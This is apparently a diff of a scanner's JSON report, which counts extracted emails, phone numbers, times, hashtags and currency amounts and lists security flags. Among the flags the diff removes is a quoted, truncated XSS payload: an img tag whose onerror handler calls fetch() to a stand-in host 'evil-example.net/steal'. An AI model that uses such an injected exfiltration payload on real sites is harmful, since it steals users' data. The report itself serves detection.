@@ -5,12 +5,7 @@
     "credit_cards_luhn_valid": 2,
     "urls_found": 4,
     "phone_numbers_found": 4,
-    "times_12h_found": 5,
-    "times_24h_found": 5,
-    "html_tags_found": 10,
-    "hashtags_found": 4,
-    "currency_amounts_found": 5,
-    "security_flags_raised": 6
+    "security_flags_raised": 5
   },
   "emails": [
     {
@@ -56,49 +51,12 @@
     "+1-202-555-0143",
     "+250.788.234.567"
   ],
-  "times": {
-    "12_hour": [
-      "9:00 AM",
-      "6:30 PM",
-      "2:45 PM",
-      "9:00 AM",
-      "5:00 PM"
-    ],
-    "24_hour": [
-      "14:45",
-      "08:00",
-      "17:00",
-      "09:00",
-      "17:00"
-    ]
-  },
-  "html_tags_found": [
-    "div",
-    "img",
-    "p",
-    "script",
-    "strong"
-  ],
-  "hashtags": [
-    "#ALU2024",
-    "#billing",
-    "#payment_bug",
-    "#urgent"
-  ],
-  "currency_amounts": [
-    "$1,250.00",
-    "\u20ac45,00",
-    "\u00a3120.75",
-    "USD 1,199.50",
-    "KES 15,000"
-  ],
   "security_flags": [
-    "Dangerous tag detected: <script> (not executed, flagged only)",
-    "Dangerous tag detected: <script> (not executed, flagged only)",
-    "Inline event handler detected in tag: <img src=x onerror=\"fetch('https://evil-example.net/steal?co...",
-    "Dangerous tag detected: <script> (not executed, flagged only)",
     "Possible SQL-injection-style fragment detected near position 2314",
-    "Possible SQL-injection-style fragment detected near position 2787"
+    "Possible SQL-injection-style fragment detected near position 2787",
+    "Possible <script> tag detected near position 1617 (not executed, flagged only)",
+    "Possible <script> tag detected near position 2968 (not executed, flagged only)",
+    "Possible inline event handler detected near position 1692 (e.g. onerror=)"
   ],
   "note": "Emails and credit card numbers are masked in this file by design. Full values are never written to disk or logs."
 }
